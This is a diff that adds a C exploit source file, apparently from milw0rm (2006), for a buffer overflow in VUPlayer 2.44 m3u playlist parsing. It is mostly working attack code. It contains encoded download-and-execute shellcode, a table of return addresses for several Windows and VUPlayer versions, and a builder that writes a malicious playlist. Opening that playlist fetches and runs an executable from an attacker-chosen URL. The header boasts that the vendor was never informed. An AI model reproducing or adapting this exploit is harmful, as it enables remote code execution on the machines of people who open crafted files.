@@ -1,0 +1,215 @@
+/*
+       _______         ________           .__        _____          __
+___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
+\  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /
+ >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    <
+/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \
+      \/      \/     \/       \/   30\11\06    \/      |__|      \/     \/
+      
+ *   mm.           dM8
+ *  YMMMb.       dMM8      _____________________________________
+ *   YMMMMb     dMMM'     [                                     ]
+ *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
+ *      `YMMM  MMM'       [ windows I have yet to look through  ]
+ *         "MbdMP         [ Going forward may not be the answer ]
+ *     .dMMMMMM.P         [                                     ]
+ *    dMM  MMMMMM         [       maybe I should go back        ]
+ *    8MMMMMMMMMMI        [_____________________________________]
+ *     YMMMMMMMMM                   www.netbunny.org
+ *       "MMMMMMP
+ *      MxM .mmm
+ *      W"W """
+
+[i] Title:              VUPlayer <= 2.44 m3u parsing remote buffer overflow
+[i] Discovered by:      Greg Linares  -  glinares.code [aaat] gmail [dooot] com
+[i] Exploit by:         Expanders  -  expanders [aaat] gmail [dooot] com
+[i] References:         http://www.vuplayer.com/
+[i] Greatings:          x0n3-h4ck - netbunny
+
+[ Research diary ]
+
+A classical buffer overflow. if we supply less than 800 bytes of buffer we can trigger an access violation
+and we can overwrite SEH handler. btw stack gets too much contaminated with lowecase transforming, section repetitions
+and a lot of bad things that make exploiting quite impossible.
+Well... if we make it eat a thousand of bytes we can really overwrite some juicy RET sections and full controlling EIP.
+
+
+[ Timeline ]
+
+Vendor hasn't been informed. Feel free to do it if you want ;)
+
+[ Notes ]
+
+RETcode type: POINTER TO [ESP]
+To improve realiability you can search your own RETcodes..
+
+[ Documentation ]
+
+Skylined Alpha2 : www.edup.tudelft.nl/~bjwever/documentation_alpha2.html.php
+
+[ Special Thanks ]
+
+Skylined
+H D Moore
+Greg Linares  <---  He really kicks ass!
+
+
+[ Links ]
+
+www.x0n3-h4ck.org
+www.netbunny.org
+
+
+
+*/
+
+
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/time.h>
+
+// Exploit internals, change only if you know what you are doing
+#define BUGSTR "#EXTM3U\n#EXTINF:470,x0n3-h4ck - omg they kick asses.wma\n%s"
+#define BUFFSIZE 5000
+#define SC_MAX_SIZE 800
+#define MAX_ENCODED_LEN 200
+
+// Offsets
+#define RET_OFFSET       1012
+
+int encode_alphanum(unsigned char *src,unsigned char *dest,int len);
+int banner();
+int usage(char *filename);
+int remote_connect( char* ip, unsigned short port );
+
+
+// win32 download and execute taken from metasploit [ tnx hdm, lion & pita ]
+// encoded using Skylined alpha2 tool
+char alphanum_dax_shellcode[] =
+        // Skylined's alpha2 alphanumeric decoder
+        "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
+        // Encoded opcodes
+        "Xk6pqJ3zvSYYqv89WL5Qk0tttJny9rzZxk6eM8zKKOKOKOT0PLNylY"
+        "Z9O3ymUhliZ9NyJ94RXYnuTRKYmU6TEBzyoaVrSq4RZJmuvrJMNgM1"
+        "ojrJ6rkWNYOj3Rvrn7LMoZt4zoHNyXUBMvLZsRtR2KkCLWIPRJuozM"
+        "J1iPYVTZQNOmiL3Kd0Kpo6kwTRsdb2yOMmnzpZsxpxOjbxmzPPKOuB"
+        "J1uBKoouMJaJRxRXMKnzPXfrMImJQJVrU3b2PnUJQONwuBcyIcMM9P"
+        "2QKyMImInyvzQOLThKxOqvjnU5YSwbSqKCNx9P1aY4MILYnyFzqOoz"
+        "joiOtYMwwixlsS7inO7izguJsEnYuBqUkCx9KzE6hNsE1NmMOj9Uyh"
+        "nWKLQNkmOjMM8ayllYj9OZpYKyyYjjJo9YsVHNSUUBqUkyjjPfHNe9"
+        "jie6xNPmoZRy055LPYJL1pXHxKxOjjRFPKhCkptrsKpwOZV9sjaaMo"
+        "cVCVu6KnylzMo9xkXvkJxXKMkMZKKLJJzJZ9YNkLHmZjkPKZZMKLKD"
+        "kml0JKkLyjXmYfZKYphXMIznjPL7Klm1kLkJlYKlkQZPHmJmhqJKyl"
+        "YhkMOin5KFkHKMN5xpkKJKzXHkKPJxLYJLJKjUYdL6kGNyhL8KzuKm"
+        "yfzNKG9eJVXxKMzmL6YOxpzU9ln8mI";
+
+
+struct retcodes{char *platform;unsigned long addr;} targets[]= {
+        { "VUPlayer 2.40 2.41 2.42", 0x01020F4F },   // vu_wma.dll push esp, ret
+        { "VUPlayer 2.43 2.44"     , 0x01030F4F },   // vu_wma.dll push esp, ret
+	{ "Windows 2k SP 4"        , 0x75031dce },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
+	{ "Windows XP SP 0/1"      , 0x71ab7bfb },   // ws2_32.dll jmp esp         [Tnx to metasploit]
+        { "Windows XP SP 2 ENG"    , 0x71ab9372 },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
+	{ "Windows XP SP 2 ITA"    , 0x77D92CFC },   // user32.dll jmp esp
+	{ NULL }
+};
+
+int banner() {
+  printf("\n       _______         ________           .__        _____          __     \n");
+  printf("___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n");
+  printf("\\  \\/  /  /_\\  \\ /    \\  _(__  <   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n");
+  printf(" >    <\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    <  \n");
+  printf("/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  >__|_ \\ \n");
+  printf("      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n");
+  printf("[i] Title:        \tVUPlayer <= 2.44 m3u Playlist Buffer overflow\n");
+  printf("[i] Discovered by:\tGreg Linares\n");
+  printf("[i] Exploit by:   \tExpanders\n\n");
+  return 0;
+}
+
+int usage(char *filename) {
+  int i;
+  printf("Usage: \t%s <filename> <url> <targ>\n\n",filename);
+  printf("       \t<filename>    : Output filename\n");
+  printf("       \t<url>         : Complete url of the executable to download\n");
+  printf("       \t<targ>        : Target from the list below\n\n");
+  printf("Ex:    \t%s exploit.m3u http://www.x0n3-h4ck.org/calc.exe 0\n\n",filename);
+  
+  printf("#   \t Platform\n");
+  printf("-----------------------------------------------\n");
+  for(i = 0; targets[i].platform; i++)
+        printf("%d \t %s\n",i,targets[i].platform);
+  printf("-----------------------------------------------\n");
+  exit(0);
+}
+
+
+int main(int argc, char *argv[]) {
+    FILE *output;
+    int position;
+    char encoded_url[MAX_ENCODED_LEN];
+    char *buffer;
+    banner();
+    if( (argc != 4) || (strstr("http://",argv[2]) < 0) )
+        usage(argv[0]);
+    printf("[+] Target OS is: %s\n",targets[atoi(argv[3])].platform);
+    printf("[+] Creating evil buffer...");
+    fflush(stdout);
+    buffer = (char *) malloc(BUFFSIZE);
+    position = 0;
+    encode_alphanum(encoded_url,argv[2],strlen(argv[2]));
+    memset(buffer,0x41,RET_OFFSET); position += RET_OFFSET;
+    memcpy(buffer+position,&targets[atoi(argv[3])].addr,4); position += 4;
+    memcpy(buffer+position,alphanum_dax_shellcode,strlen(alphanum_dax_shellcode));  position += strlen(alphanum_dax_shellcode);
+    memcpy(buffer+position,encoded_url,strlen(encoded_url)); position += strlen(encoded_url);
+    memset(buffer+position,0x00,1);
+    printf("done\n");
+    printf("[+] Opening file...");
+    fflush(stdout);
+    if(!(output = fopen(argv[1],"w"))) {
+        fprintf(stderr,"error\n");
+        return 1;
+    }
+    printf("done\n");
+    printf("[+] Writing stuff into the file\n");
+    fprintf(output,BUGSTR,buffer);
+    printf("[+] Done! %s created!\n",argv[1]);
+    fclose(output);
+    free(buffer);
+    return 0;
+}
+
+// Ripped from Skylined's alpha2.c
+int encode_alphanum(unsigned char *dest,unsigned char *src,int len){
+  char dump[2];
+  int   i,n, input, A, B, C, D, E, F;
+  char* valid_chars;
+  struct timeval tv;
+  struct timezone tz;
+  memset(dest,0x00,MAX_ENCODED_LEN);
+  gettimeofday(&tv, &tz);
+  srand((int)tv.tv_sec*1000+tv.tv_usec);
+  strcat(src,"\x80");
+  valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+  for(n=0;n<len;n++) {
+    input = src[n];
+    A = (input & 0xf0) >> 4;
+    B = (input & 0x0f);
+    F = B;
+    i = rand() % strlen(valid_chars);
+    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
+    E = valid_chars[i] >> 4;
+    D = (A^E);
+    i = rand() % strlen(valid_chars);
+    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
+    C = valid_chars[i] >> 4;
+    sprintf(dump,"%c%c", (C<<4)+D, (E<<4)+F);
+    strcat(dest,dump);
+  }
+  strcat(dest,"A");
+  return 0;
+}
+
+// milw0rm.com [2006-11-30]
